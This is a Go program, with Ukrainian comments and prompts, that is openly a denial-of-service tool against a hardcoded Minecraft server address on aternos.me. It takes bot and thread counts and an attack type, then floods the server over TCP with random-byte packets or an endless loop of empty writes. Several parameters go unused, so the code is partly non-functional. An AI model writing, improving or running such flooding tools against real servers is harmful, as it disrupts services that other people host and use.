package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"time"
)

const (
	// Адреса сервера
	serverAddr = "Zemond22.aternos.me:64766"

	// Максимальна довжина пакета
	maxPacketLength = 1024

	// Затримка між пакетами (мілісекунди)
	packetDelay = 10
)

var (
	// Значення за замовчуванням
	defaultPacketCount    = 1000
	defaultTargetProtocol = "1.16.5"
	defaultThreadCount    = 1
	defaultPacketWeight   = 1
	defaultBotCount       = 1
)

func main() {
	var targetProtocol string
	var threadCount, packetWeight, botCount int
	var attackType string

	// Введення налаштувань
	fmt.Println("Налаштування:")
	fmt.Print("Ціль протоколу версії: ")
	fmt.Scan(&targetProtocol)
	fmt.Print("Кількість потоків: ")
	fmt.Scan(&threadCount)
	fmt.Print("Вага пакета: ")
	fmt.Scan(&packetWeight)
	fmt.Print("Кількість ботів: ")
	fmt.Scan(&botCount)
	fmt.Print("Тип атаки (напишіть 'нульова' для нульової атаки): ")
	fmt.Scan(&attackType)

	// Створення сокета
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error connecting to server: %v\n", err)
		return
	}

	// Ініціалізація генератора випадкових чисел
	rand.Seed(time.Now().UnixNano())

	switch attackType {
	case "нульова":
		// Запуск нульової атаки
		startNullAttack(conn)
	default:
		// Запуск ботів
		for i := 0; i < botCount; i++ {
			go startBot(conn, targetProtocol, threadCount, packetWeight)
		}
	}

	// Вічний цикл консольного меню
	for {
		fmt.Println("Виберіть дію:")
		fmt.Println("1. Зупинити атаку")
		fmt.Println("2. Вийти")
		var choice int
		fmt.Print("Ваш вибір: ")
		_, err := fmt.Scanf("%d", &choice)
		if err != nil {
			fmt.Println("Помилка при введенні вибору.")
			continue
		}

		switch choice {
		case 1:
			fmt.Println("Атака зупинена.")
			return
		case 2:
			fmt.Println("Вихід з програми.")
			return
		default:
			fmt.Println("Невідомий вибір.")
		}
	}
}

func startBot(conn net.Conn, targetProtocol string, threadCount, packetWeight int) {
	// Створення каналу для пакетів
	packets := make(chan []byte, defaultPacketCount)

	// Запуск горутини для генерації пакетів
	go func() {
		for i := 0; i < defaultPacketCount; i++ {
			packets <- generatePacket()
		}
	}()

	// Відправлення пакетів на сервер
	ticker := time.NewTicker(time.Millisecond * packetDelay)
	for packet := range packets {
		_, err := conn.Write(packet)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error sending packet: %v\n", err)
			return
		}
		<-ticker.C
	}
}

func startNullAttack(conn net.Conn) {
	// Вічний цикл відправлення порожніх пакетів
	for {
		_, err := conn.Write([]byte{})
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error sending packet: %v\n", err)
			return
		}
		time.Sleep(time.Millisecond * packetDelay)
	}
}

func generatePacket() []byte {
	// Створення пакета з випадковим вмістом
	length := rand.Intn(maxPacketLength)
	data := make([]byte, length)
	rand.Read(data)
	return data
}
